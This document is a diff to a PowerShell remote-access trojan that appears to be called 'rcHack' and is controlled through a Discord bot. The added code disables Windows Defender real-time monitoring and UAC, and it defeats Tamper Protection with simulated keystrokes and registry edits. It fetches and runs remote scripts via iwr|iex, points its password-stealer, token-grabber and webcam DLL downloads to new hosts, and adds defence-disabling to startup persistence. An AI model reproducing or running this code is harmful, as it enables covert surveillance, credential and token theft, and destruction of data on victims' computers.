@@ -1,3 +1,6 @@
+Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 #your bot token goes here
 #EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
 $token = "YOUR_DISCORD_BOT_TOKEN_HERE"
@@ -14,9 +17,11 @@ $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIP
 
 
 
+
+
 $channel_id = $null
 $last_message_id = $null
-$dir = "$Env:USERPROFILE\Desktop"
+$global:dir = "$Env:USERPROFILE\Desktop"
 $highestSession = $null
 $adminState = $null
 $uri = "https://discord.com/api/guilds/$guildId/channels"
@@ -175,8 +180,8 @@ function DiscordCommand {
 }
         "dir"{
     $output = @()
-    $items = Get-ChildItem -Path $dir
-    $output += "Directory: $dir`n"
+    $items = Get-ChildItem -Path $global:dir
+    $output += "Directory: $($global:dir)`n"
     foreach ($item in $items) {
     if ($item.PSIsContainer) {
     $output += "FOLDER - $($item.Name)"
@@ -195,7 +200,7 @@ function DiscordCommand {
     Write-Host "'$param' is not a directory."
     Send-Discord ('`' + $param + '` is not a directory.')
     } else {
-    $fullPath = Join-Path -Path $dir -ChildPath $param
+    $fullPath = Join-Path -Path $global:dir -ChildPath $param
     if (Test-Path $fullPath -PathType Container) {
     $global:dir = $fullPath
     Write-Host "Changed current directory to $param"
@@ -211,7 +216,7 @@ function DiscordCommand {
     if (Test-Path $param -PathType Leaf) {
     $fullPath = $param
     } else {
-    $fullPath = Join-Path -Path $dir -ChildPath $param}
+    $fullPath = Join-Path -Path $global:dir -ChildPath $param}
     if (Test-Path $fullPath -PathType Leaf) {
     Write-Host $fullPath
     Send-Discord -Attachment $fullPath
@@ -221,7 +226,7 @@ function DiscordCommand {
 }
         "upload" {
     $fileName = [System.IO.Path]::GetFileName($param) -replace '[?&].*'
-    $outputPath = Join-Path -Path $dir -ChildPath $fileName
+    $outputPath = Join-Path -Path $global:dir -ChildPath $fileName
     Invoke-WebRequest -Uri $param -OutFile $outputPath  -UseBasicParsing
     if (Test-Path $outputPath) {
     Write-Host "File uploaded."
@@ -229,18 +234,31 @@ function DiscordCommand {
     Write-Host "Unknown error, most likely failed."}
 }
         "delete"{
-    $param = $param -replace '/', '\'
-    if (Test-Path $param) {
-    Remove-Item -Path $param -Force -Recurse
-    if (Test-Path $param) {
-    Write-Host "Failed to delete '$param'."
-    Send-Discord ('Failed to delete `' + $param + '`')
-    } else {
-    Write-Host "'$param' deleted successfully."
-    Send-Discord ('`' + $param + '` deleted successfully.')}
-    } else {
-    Write-Host "Path '$param' does not exist."
-    Send-Discord ("Path `'$param`' does not exist.")}
+            $param = $param -replace '/', '\'
+            if (Test-Path $param -PathType Leaf) {
+                $fullPath = $param
+            } else {
+                $fullPath = Join-Path -Path $global:dir -ChildPath $param
+            }
+            
+            if (Test-Path $fullPath) {
+                if (Test-Path $fullPath -PathType Leaf) {
+                    Remove-Item -Path $fullPath -Force
+                    Write-Host "File deleted: $fullPath"
+                    Send-Discord "File deleted: $fullPath"
+                } elseif (Test-Path $fullPath -PathType Container) {
+                    Remove-Item -Path $fullPath -Recurse -Force
+                    Write-Host "Directory deleted: $fullPath"
+                    Send-Discord "Directory deleted: $fullPath"
+                } else {
+                    Write-Host "The path $fullPath does not point to a file or directory."
+                    Send-Discord "The path $fullPath does not point to a file or directory."
+                }
+            } else {
+                Write-Host "File location does not exist: $fullPath"
+                Send-Discord "File location does not exist: $fullPath"
+            }
+            
 }
         "availwifi" {
     $wifiNetworks = netsh wlan show networks mode=Bssid | Select-String "SSID|Signal|Authentication|Cipher" | ForEach-Object { $_.ToString() }
@@ -271,7 +289,7 @@ function DiscordCommand {
         "webcampic"{
     $dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
     if (-not (Test-Path $dllPath)) {
-    $url = "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll"
+    $url = "https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/Webcam.dll"
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($url, $dllPath)}
     Add-Type -Path $dllPath
@@ -347,25 +365,7 @@ function DiscordCommand {
     Send-Discord -Attachment (Join-Path $env:temp 'Keylog.txt')
 }
         "voicelogger"{
-    function voiceLogger {
-    Add-Type -AssemblyName System.Speech
-    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-    $grammar = New-Object System.Speech.Recognition.DictationGrammar
-    $recognizer.LoadGrammar($grammar)
-    $recognizer.SetInputToDefaultAudioDevice()
-    while ($true) {
-    $result = $recognizer.Recognize()
-    if ($result) {
-    $results = $result.Text
-    Write-Output $results
-    $voicelogPath = Join-Path $env:temp 'VoiceLog.txt'
-    $results | Out-File -Append -FilePath $voicelogPath
-    Write-Host "Voice log started, saving to $voicelogPath"
-    Send-Discord ('Voice log started, saving to `' + $voicelogPath + '`')
-    switch -regex ($results) {
-    '\bnote\b' {saps notepad}
-    '\bexit\b' {break}}}}}
-    Start-Job -ScriptBlock { voiceLogger }
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/voicelogger.ps1' | iex}`"" -WindowStyle Hidden
     Write-Host "Voice logger started."        
     Send-Discord "Voice logger started."
 }
@@ -374,13 +374,52 @@ function DiscordCommand {
     Send-Discord -Attachment (Join-Path $env:temp 'VoiceLog.txt')
 }
         "disabledefender" {
-    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
     Write-Host "Requires admin."
     Send-Discord "Requires admin."
     } else {
-    Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
-    Write-Host "Command executed."
-    Send-Discord "Command executed."}
+#disable realtime monitoring
+Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+
+#disable uac
+    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+    #disable tamper protection
+while ($true) {
+    # Check if Tamper Protection is enabled
+    if ((Get-MpComputerStatus).IsTamperProtected) {
+        # if Tamper Protection is enabled, perform actions
+
+        $shell = New-Object -ComObject WScript.Shell
+        $shell.SendKeys("^{ESC}")
+        Start-Sleep -Seconds 1
+        $shell.SendKeys("Tamper Protection")
+        Start-Sleep -Seconds 2
+        $shell.SendKeys("{ENTER}")
+        Start-Sleep -Seconds 4
+        1..4 | ForEach-Object {
+            $shell.SendKeys("{TAB}")
+            Start-Sleep -Milliseconds 200
+        }
+        $shell.SendKeys(" ")
+        Start-Sleep -Seconds 1
+        $shell.SendKeys("{RIGHT}")
+        $shell.SendKeys("%y")
+        $shell.SendKeys("{ENTER}")
+        $shell.SendKeys("%{F4}")
+        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtection /t REG_DWORD /d 4 /f" -Verb RunAs -Wait
+        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtectionSource /t REG_DWORD /d 2 /f" -Verb RunAs -Wait
+        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v SenseDevMode /t REG_DWORD /d 0 /f" -Verb RunAs -Wait
+
+        Write-Host "Tamper Protection is enabled."
+    } else {
+        # if Tamper Protection is disabled, break the loop
+        Write-Host "Tamper Protection is not enabled."
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/disabledefender.ps1' | iex}`"" -WindowStyle Hidden
+        break
+    }
+Send-Discord "Command executed."
+}
+}
 }
         "disablefirewall" {
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
@@ -427,7 +466,7 @@ function DiscordCommand {
     function Open-Website {
     param(
     [string]$url)
-    $chromePath = Get-DiscordCommand -ErrorAction SilentlyContinue "chrome.exe"
+    $chromePath = Get-DiscordCommand "chrome.exe" -ErrorAction SilentlyContinue
     if ($chromePath) {
     Start-Process "chrome.exe" -ArgumentList $url
     } else {
@@ -452,7 +491,7 @@ function DiscordCommand {
 function Get-Password {
     # Define the URLs for password grabbing assemblies
     $dllUrls = @{
-        "password" = "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll"
+        "password" = "https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/PasswordStealer.dll"
     }
     
     # Define the dictionary to hold loaded assemblies
@@ -489,7 +528,7 @@ function Get-Password {
     Send-Discord -Attachment "$env:TEMP\passwords.txt"
 }
         "tokengrabber"{
-$dllUrl = "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll"
+$dllUrl = "https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/Token%20grabber.dll"
 $dllPath = "$env:TEMP\TokenGrabber.dll"
 Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath
 Add-Type -Path $dllPath
@@ -838,6 +877,7 @@ if ($process -ne $null) {
         }
         "startup"{
 $scriptContent = @"
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring 1";
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb '$StartupPsOnlineFileLocation' | iex"
 "@
 $encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
@@ -1031,7 +1071,7 @@ E          X          A          M          P          L          E          S
         on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
     Example: !startup
 
-48. !implode           // Triggers a system implosion (Use with caution!)
+48. !implode           // Triggers a system implosion (Leaves no trace)
     Example: !implode
 
 49. !help              // Displays information about available commands
@@ -1066,7 +1106,8 @@ DiscordCommand -DiscordCommandName webcampic
 
 
 
-
+Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableRealtimeMonitoring $true
 #incoming command loop
 while ($true) {
     $headers = @{
